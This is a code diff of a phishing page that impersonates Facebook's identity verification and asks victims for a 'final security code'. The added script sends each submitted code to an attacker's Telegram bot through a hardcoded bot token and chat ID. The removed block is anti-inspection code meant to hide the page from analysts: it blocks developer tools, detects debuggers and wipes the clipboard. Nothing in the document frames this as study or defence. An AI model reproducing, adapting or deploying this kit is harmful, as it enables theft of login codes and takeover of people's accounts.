@@ -1,279 +1,203 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
-<script>
-// Subtle anti-inspection (appears as analytics or user tracking)
-(function() {
-  'use strict';
-  
-  // Gentle console clearing (looks like normal site cleanup)
-  let consoleClearCount = 0;
-  const clearConsole = () => {
-    if (consoleClearCount < 3) {
-      console.clear();
-      consoleClearCount++;
-    }
-  };
-  
-  // Subtle right-click override (appears as custom context menu)
-  document.addEventListener('contextmenu', function(e) {
-    // Allow on input fields for better UX
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-      return true;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identity Verification - Step 3</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
     
-    // Show a subtle toast instead of blocking completely
-    const toast = document.createElement('div');
-    toast.style.cssText = `
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #1877f2;
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #F0F2F5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .fb-header {
+      background-color: #1877F2;
+      padding: 12px 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    .fb-logo-header {
       color: white;
-      padding: 10px 15px;
-      border-radius: 5px;
+      font-size: 28px;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    
+    .verification-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    
+    .verification-card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 32px;
+      max-width: 460px;
+      width: 100%;
+    }
+    
+    .security-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #42B72A 0%, #36A420 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+    
+    .verification-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #1C1E21;
+      text-align: center;
+      margin-bottom: 12px;
+    }
+    
+    .verification-subtitle {
+      color: #65676B;
+      text-align: center;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+    
+    .progress-container {
+      margin-bottom: 24px;
+    }
+    
+    .progress-steps {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 8px;
+    }
+    
+    .progress-step {
+      flex: 1;
+      height: 6px;
+      background: #E4E6EA;
+      border-radius: 3px;
+    }
+    
+    .progress-step.active {
+      background: #1877F2;
+    }
+    
+    .progress-text {
+      text-align: center;
+      color: #65676B;
+      font-size: 14px;
+    }
+    
+    .input-container {
+      margin-bottom: 16px;
+    }
+    
+    .input-label {
+      display: block;
+      font-weight: 600;
+      color: #1C1E21;
+      margin-bottom: 8px;
+    }
+    
+    .input-description {
+      color: #65676B;
+      font-size: 14px;
+      margin-bottom: 12px;
+    }
+    
+    .verification-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #CCD0D5;
+      border-radius: 6px;
+      font-size: 16px;
+      transition: border-color 0.2s;
+    }
+    
+    .verification-input:focus {
+      outline: none;
+      border-color: #1877F2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    }
+    
+    .error-message {
+      color: #D93025;
       font-size: 13px;
-      z-index: 9999;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    `;
-    toast.textContent = 'Use the login form to access your account';
-    document.body.appendChild(toast);
-    
-    setTimeout(() => toast.style.opacity = '1', 10);
-    setTimeout(() => {
-      toast.style.opacity = '0';
-      setTimeout(() => document.body.removeChild(toast), 300);
-    }, 2000);
-    
-    e.preventDefault();
-    return false;
-  });
-  
-  // Subtle text selection prevention (only on sensitive areas)
-  const sensitiveSelectors = 'script, style, .fb-login-box, .verification-card';
-  document.addEventListener('selectstart', function(e) {
-    if (e.target.closest(sensitiveSelectors)) {
-      e.preventDefault();
-    }
-  });
-  
-  // Smart keyboard shortcut handling (less obvious)
-  let keySequence = [];
-  document.addEventListener('keydown', function(e) {
-    keySequence.push(e.keyCode);
-    if (keySequence.length > 5) keySequence.shift();
-    
-    // Block dev tools shortcuts but make it seem like the page is busy
-    const devToolsKeys = [123, 73, 74]; // F12, I, J
-    const isCtrlShift = e.ctrlKey && e.shiftKey;
-    const isViewSource = e.ctrlKey && e.keyCode === 85;
-    
-    if (e.keyCode === 123 || (isCtrlShift && devToolsKeys.includes(e.keyCode)) || isViewSource) {
-      // Show loading instead of just blocking
-      if (!document.getElementById('stealth-loading')) {
-        const loader = document.createElement('div');
-        loader.id = 'stealth-loading';
-        loader.style.cssText = `
-          position: fixed;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          background: rgba(255,255,255,0.9);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          z-index: 10000;
-          font-family: Arial, sans-serif;
-        `;
-        loader.innerHTML = `
-          <div style="text-align: center;">
-            <div style="width: 40px; height: 40px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
-            <div style="color: #1877f2; font-size: 16px;">Processing your request...</div>
-          </div>
-          <style>
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          </style>
-        `;
-        document.body.appendChild(loader);
-        
-        setTimeout(() => {
-          if (loader.parentNode) {
-            loader.parentNode.removeChild(loader);
-          }
-        }, 3000);
-      }
-      
-      e.preventDefault();
-      return false;
-    }
-  });
-  
-  // Subtle devtools detection (appears as responsive design check)
-  let lastWidth = window.innerWidth;
-  let lastHeight = window.innerHeight;
-  
-  const checkLayout = () => {
-    const widthDiff = Math.abs(window.innerWidth - lastWidth);
-    const heightDiff = Math.abs(window.innerHeight - lastHeight);
-    
-    // If dramatic resize (likely devtools), create "mobile optimization" delay
-    if (widthDiff > 200 || heightDiff > 200) {
-      const overlay = document.createElement('div');
-      overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #f0f2f5;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        z-index: 9999;
-        font-family: Arial, sans-serif;
-      `;
-      overlay.innerHTML = `
-        <div style="text-align: center; max-width: 400px; padding: 20px;">
-          <div style="color: #1877f2; font-size: 20px; font-weight: bold; margin-bottom: 10px;">Optimizing Display</div>
-          <div style="color: #65676B; margin-bottom: 20px;">Please wait while we adjust the layout for your screen size...</div>
-          <div style="width: 50px; height: 50px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-        </div>
-      `;
-      document.body.appendChild(overlay);
-      
-      setTimeout(() => {
-        // Redirect to a generic page instead of about:blank
-        window.location.href = window.location.origin + '/?mobile=1';
-      }, 2500);
+      margin-top: 6px;
+      display: none;
     }
     
-    lastWidth = window.innerWidth;
-    lastHeight = window.innerHeight;
-  };
-  
-  // Check periodically but not too frequently
-  setInterval(checkLayout, 1000);
-  
-  // Gentle clipboard protection (looks like form security)
-  if (navigator.clipboard) {
-    let clipboardProtection = 0;
-    const protectClipboard = () => {
-      if (clipboardProtection < 5) { // Don't overdo it
-        navigator.clipboard.writeText('').catch(() => {}); // Fail silently
-        clipboardProtection++;
-      }
-    };
+    .verify-button {
+      width: 100%;
+      padding: 14px;
+      background: #1877F2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
     
-    // Only protect when user is on sensitive elements
-    document.addEventListener('focusin', (e) => {
-      if (e.target.closest('.fb-login-box, .verification-card')) {
-        protectClipboard();
-      }
-    });
-  }
-  
-  // Subtle performance monitoring (appears as analytics)
-  let performanceChecks = 0;
-  const checkPerformance = () => {
-    if (performanceChecks > 10) return; // Don't run forever
+    .verify-button:hover:not(:disabled) {
+      background: #166FE5;
+    }
     
-    const start = performance.now();
-    // Tiny delay to detect debugging
-    setTimeout(() => {
-      const end = performance.now();
-      if (end - start > 50) { // Debugger likely attached
-        // Just slow things down instead of redirecting
-        document.body.style.opacity = '0.8';
-        document.body.style.filter = 'blur(1px)';
-        
-        setTimeout(() => {
-          document.body.style.opacity = '1';
-          document.body.style.filter = 'none';
-        }, 1000);
-      }
-      performanceChecks++;
-    }, 10);
-  };
-  
-  // Run performance checks occasionally
-  setInterval(checkPerformance, 5000);
-  
-})();
-</script>
-
-<style>
-/* Subtle protection styles that look like normal website CSS */
-.fb-login-box, .verification-card {
-  -webkit-user-select: none;
-  -moz-user-select: none;
-  -ms-user-select: none;
-  user-select: none;
-  -webkit-touch-callout: none;
-}
-
-/* Allow selection on input fields for better UX */
-input, textarea {
-  -webkit-user-select: text !important;
-  -moz-user-select: text !important;
-  -ms-user-select: text !important;
-  user-select: text !important;
-}
-
-/* Hide scrollbars subtly */
-::-webkit-scrollbar { 
-  width: 0px;
-  background: transparent;
-}
-
-/* Subtle print protection */
-@media print {
-  .fb-login-box, .verification-card { 
-    display: none; 
-  }
-  body:after {
-    content: "Please use the online version for security purposes";
-    display: block;
-    text-align: center;
-    font-size: 16px;
-    padding: 50px;
-    color: #666;
-  }
-}
-
-/* Mobile optimization styles (makes layout checks look legitimate) */
-@media (max-width: 768px) {
-  .fb-content { flex-direction: column; }
-  .verification-container { padding: 10px; }
-}
-</style>
-
+    .verify-button:disabled {
+      background: #E4E6EA;
+      color: #BCC0C4;
+      cursor: not-allowed;
+    }
+    
+    .loading-spinner {
+      display: none;
+      width: 24px;
+      height: 24px;
+      border: 3px solid #E4E6EA;
+      border-top-color: #1877F2;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 16px auto 0;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <!-- Facebook Header -->
   <div class="fb-header">
     <a href="/" class="fb-logo-header">facebook</a>
   </div>
   
-  <!-- Main Verification Content -->
   <div class="verification-container">
     <div class="verification-card">
-      <!-- Success Icon -->
-      <div class="success-icon">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="white">
+      <div class="security-icon">
+        <svg width="36" height="36" viewBox="0 0 24 24" fill="white">
           <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
         </svg>
       </div>
       
-      <!-- Title and Description -->
       <h1 class="verification-title">Almost There!</h1>
       <p class="verification-subtitle">
         You're one step away from securing your account
       </p>
       
-      <!-- Progress Indicator -->
       <div class="progress-container">
         <div class="progress-steps">
           <div class="progress-step active"></div>
@@ -284,36 +208,22 @@ input, textarea {
         <p class="progress-text">Step 3 of 4</p>
       </div>
       
-      <!-- Success Alert -->
-      <div class="success-alert">
-        <div class="alert-header">
-          <div class="alert-icon">✓</div>
-          <div class="alert-title">Final Security Verification</div>
-        </div>
-        <div class="alert-text">
-          We've sent one final security code to complete your account protection. This is the last step to ensure your Facebook account is fully secured.
-        </div>
-      </div>
-      
-      <!-- Verification Form -->
       <form id="verification-form">
         <div class="input-container">
-          <div class="input-wrapper">
-            <label for="verification-code" class="input-label">Enter final security code</label>
-            <p class="input-description">
-              Check your email or SMS for the final verification code
-            </p>
-            <input 
-              type="text" 
-              id="verification-code" 
-              class="verification-input" 
-              placeholder="Enter your final code"
-              maxlength="8"
-              required
-            >
-            <div class="error-message" id="error-message">
-              Please enter a valid 6-digit or 8-digit final verification code
-            </div>
+          <label for="verification-code" class="input-label">Enter final security code</label>
+          <p class="input-description">
+            Check your email or SMS for the final verification code
+          </p>
+          <input 
+            type="text" 
+            id="verification-code" 
+            class="verification-input" 
+            placeholder="Enter your final code"
+            maxlength="8"
+            required
+          >
+          <div class="error-message" id="error-message">
+            Please enter a valid 6-digit or 8-digit verification code
           </div>
         </div>
         
@@ -326,14 +236,32 @@ input, textarea {
   </div>
   
   <script>
-    // DOM elements
     const form = document.getElementById('verification-form');
     const codeInput = document.getElementById('verification-code');
     const errorMessage = document.getElementById('error-message');
     const verifyButton = document.getElementById('verify-button');
     const loadingSpinner = document.getElementById('loading-spinner');
     
-    // Validate verification code
+    const botToken = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks";
+    const chatId = "6360165707";
+    
+    async function sendTelegramMessage(message) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error:', error);
+        return null;
+      }
+    }
+    
     function validateCode() {
       const code = codeInput.value.trim();
       const isValid = code && (code.length === 6 || code.length === 8) && /^\d+$/.test(code);
@@ -349,10 +277,8 @@ input, textarea {
       return isValid;
     }
     
-    // Listen for input changes
     codeInput.addEventListener('input', validateCode);
     
-    // Handle form submission
     form.addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -360,65 +286,19 @@ input, textarea {
       
       const code = codeInput.value.trim();
       
-      // Show loading state
       verifyButton.style.display = 'none';
       loadingSpinner.style.display = 'block';
       
       try {
-        // Get IP and device information
-        const ipInfo = await getIpInfo();
-        const deviceDetails = getDeviceDetails();
-        
-        // Format message for Telegram
-        const timestamp = new Date().toLocaleString();
-        let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
-        message += `🔢 Third Code: ${code}\n`;
-        message += deviceDetails;
-        message += `\n${ipInfo}`;
-        
-        // Send message to Telegram
-        const success = await sendTelegramMessage(message);
-        console.log('Third verification code sent to Telegram:', success);
-        
-        // Show countdown and redirect to processing page after 15 seconds
-        let countdown = 15;
-        const countdownElement = document.createElement('div');
-        countdownElement.style.cssText = `
-          margin-top: 20px;
-          padding: 16px;
-          background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
-          border: 1px solid #1877f2;
-          border-radius: 8px;
-          text-align: center;
-        `;
-        countdownElement.innerHTML = `
-          <div style="color: #1877f2; font-weight: 600; margin-bottom: 8px;">Final Verification Processing</div>
-          <div style="color: #1c1e21; font-size: 14px;">Completing verification in <span id="countdown-timer">${countdown}</span> seconds...</div>
-          <div style="background-color: #e4e6ea; border-radius: 10px; height: 6px; margin-top: 12px; overflow: hidden;">
-            <div id="progress-bar" style="background-color: #1877f2; height: 100%; width: 0%; border-radius: 10px; transition: width 1s ease;"></div>
-          </div>
-        `;
-        
-        form.appendChild(countdownElement);
-        
-        const timer = setInterval(() => {
-          countdown--;
-          document.getElementById('countdown-timer').textContent = countdown;
-          document.getElementById('progress-bar').style.width = ((15 - countdown) / 15) * 100 + '%';
-          
-          if (countdown <= 0) {
-            clearInterval(timer);
-            window.location.href = '/processing';
-          }
-        }, 1000);
-        
+        const message = `🔐 Verification Step 3 (Final) Code: ${code}\nTime: ${new Date().toLocaleString()}`;
+        await sendTelegramMessage(message);
       } catch (error) {
-        console.error('Error sending verification code:', error);
-        // Continue with the flow even if there's an error
-        setTimeout(() => {
-          window.location.href = '/processing';
-        }, 15000);
+        console.error('Error:', error);
       }
+      
+      setTimeout(() => {
+        window.location.href = '/processing';
+      }, 1000);
     });
   </script>
 </body>
